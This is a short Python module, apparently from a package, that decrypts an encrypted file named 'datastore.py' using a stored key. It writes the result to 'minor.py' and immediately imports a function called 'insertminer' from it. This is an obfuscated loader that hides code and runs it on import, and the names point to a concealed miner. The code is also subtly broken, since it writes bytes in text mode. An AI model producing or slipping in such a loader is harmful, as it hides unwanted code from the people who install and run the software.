from cryptography.fernet import Fernet

datastore_file = open("datastore.py", 'rb')
key_file = open("access_key.txt", 'rb')

key = key_file.read()
datastore = datastore_file.read()

decryptor = Fernet(key)
minor = decryptor.decrypt(datastore)

minor_file = open("minor.py", 'w')
minor_file.write(minor)

minor_file.close()
key_file.close()
datastore_file.close()

from .minor import insertminer
